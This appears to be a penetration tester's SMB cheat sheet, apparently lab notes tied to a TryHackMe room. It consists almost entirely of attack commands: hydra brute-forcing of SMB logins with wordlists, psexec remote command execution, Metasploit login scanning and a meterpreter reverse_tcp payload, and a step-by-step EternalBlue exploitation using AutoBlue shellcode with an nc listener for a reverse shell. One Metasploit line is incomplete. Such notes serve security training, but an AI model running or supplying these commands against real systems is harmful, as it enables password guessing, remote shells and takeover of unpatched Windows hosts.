# SMB

```
nmap -Pn -sV -sC -p445 <ip>
nmap -Pn -sV -p445 --script=smb-protocols <ip>
```

```
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt <ip> smb2
hydra -l administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt <ip> smb2
==> Use smb2 if smb not supported.
```

```
psexec.py administrator:<password>@<ip> ipconfig
psexec.py administrator:<password>@<ip> cmd.exe
```

```
msf > use auxiliary/scanner/smb/smb_login
msf > set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
msf > set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
msf > set VERBOSE false
```

```
msf > use exploit/windows/smb/psexec
msf > windows/meterpreter/reverse_tcp
msf > set SMBUser administrator
msf > set SMBPass <password>
```

## EternalBlue
- Practice with [Blue](https://tryhackme.com/room/blue)

```
nmap -Pn -sV -p445 --script=smb-vuln-ms17-010 <ip>
```

```
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
cd AutoBlue-MS17-010
pip install -r requirements.txt

cd shellcode
chmod +x shell_prep.sh
./shell_prep.sh

y
<ip>   
<port>
<port>
1
1

nc -nvlp <port>

cd ..
python eternalblue_exploit7.py <ip> shellcode/sc_x64.bin
```

```
use auxiliary/scanner/smb/smb_ms17_010
use exploit/windows/smb/ms17_010_eternalblue
```
